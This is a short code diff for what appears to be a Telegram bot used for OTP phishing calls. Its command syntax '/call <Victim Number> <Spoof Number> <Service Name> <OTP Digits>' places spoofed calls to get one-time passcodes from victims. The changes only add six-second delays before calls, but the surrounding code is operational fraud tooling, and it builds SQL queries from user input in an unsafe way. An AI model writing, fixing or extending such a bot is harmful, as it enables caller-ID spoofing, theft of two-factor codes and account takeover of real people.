@@ -1034,6 +1034,7 @@ def recall_now(message):
 ✋ <b>Hold on !</b> Calling in progress
 
 ❌ Press /endcall to disconnect all active calls.""",parse_mode='HTML')
+                        time.sleep(6)
                         try:   
                             c.execute(f"select * from call_data where chat_id={id} limit 1")
                             last_script = c.fetchone()
@@ -1881,6 +1882,7 @@ def make_call_command(message):
                         c.execute(f"update call_data set last_service='{service_name}',otp_digits={otp_digits} where chat_id={id} ")
                         db.commit()
                         call_update(id)
+                        time.sleep(6)
                         a = make_call(f=f"{spoof}",t=f"{number}", user_id=id,service=service_name,amd=row[13])
                     except:
                         bot.send_message(message.from_user.id, f"*Invalid command\n/call <Victim Number> <Spoof Number> <Service Name> <OTP Digits> <voice>*",parse_mode='markdown')
@@ -1939,6 +1941,7 @@ def make_call_custon(message):
                                 c.execute(f"update call_data set last_service='custom' where chat_id={id} ")
                                 db.commit()
                                 call_update(id)
+                                time.sleep(6)
                                 b=custom_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id,amd=row[13])
 
                         else:
